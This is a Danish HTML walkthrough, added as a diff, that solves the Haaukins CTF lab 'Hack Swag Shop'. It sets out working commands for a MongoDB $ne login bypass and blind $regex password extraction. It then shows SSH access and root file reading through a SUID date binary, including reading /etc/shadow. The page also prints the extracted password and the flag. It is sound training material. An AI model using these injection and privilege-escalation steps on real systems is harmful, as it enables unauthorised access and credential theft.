@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Hack Swag Shop — tutorial (NoSQL bypass → SUID date root)</title>
+<meta name="description" content="Guide til Haaukins Hack Swag Shop: MongoDB NoSQL-operator-injection giver auth-bypass + blind $regex-password-ekstraktion; SSH ind og privesc via SUID date (GTFObins).">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/hack-swag-shop.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Hack Swag Shop — tutorial (NoSQL bypass → SUID date root)">
+<meta property="og:description" content="Guide til Haaukins Hack Swag Shop: MongoDB NoSQL-operator-injection giver auth-bypass + blind $regex-password-ekstraktion; SSH ind og privesc via SUID date (GTFObins).">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/hack-swag-shop.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Hack Swag Shop", "description": "Guide til Haaukins Hack Swag Shop: MongoDB NoSQL-operator-injection giver auth-bypass + blind $regex-password-ekstraktion; SSH ind og privesc via SUID date (GTFObins).", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/hack-swag-shop.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Hack Swag Shop</h1>
+<p class="subtitle">NoSQL auth-bypass → blind password-ekstraktion → SSH → SUID date → root.</p>
+<div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>1. NoSQL auth-bypass (MongoDB)</h2>
+<p>Login-API'et sanerer ikke JSON — send operatorer i stedet for strenge:</p>
+             <pre><code>curl -H 'Content-Type: application/json' \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}' http://hackswag.hkn/api/v1/users/login
+#  -> {"token":"eyJ..."}  (logget ind som første bruger "quantumpulse")</code></pre>
+<h2>2. Blind $regex-ekstraktion af passwordet</h2>
+<p>Login giver 200/401 som orakel — udtræk passwordet tegn-for-tegn:</p>
+             <pre><code>{"username":"quantumpulse","password":{"$regex":"^&lt;prefix&gt;"}}   # 200 hvis match
+# -> quAGQNEhdpKkwB4jX6y3MWmS8gT2vCJP (32 tegn)</code></pre>
+<h2>3. SSH + privesc via SUID date</h2>
+<pre><code>ssh quantumpulse@&lt;ip&gt;   # det udtrukne password
+find / -perm -4000 -type f 2>/dev/null     # /bin/date = SUID root!
+date -f /root/flag.txt      # GTFObins: læser filen som root, fejler med indholdet som "invalid date"
+#  -> date: invalid date 'DDC{...}'</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">DDC{Brut3-2-D4t3-2-R00t-Fl4g}</span> (Brute→Date→Root).</p>
+        <p>(Bonus-vuln: JWT HS256 med tom secret <code>""</code> → tokens kan forges, men API'et har ingen andre endpoints.)</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Usaniteret JSON-login = NoSQL-operator-injection (<code>$ne</code>, <code>$regex</code>) → bypass + blind ekstraktion.</li><li>SUID <code>date -f &lt;fil&gt;</code> læser en root-fil (GTFObins); verificér med <code>date -f /etc/shadow</code>.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
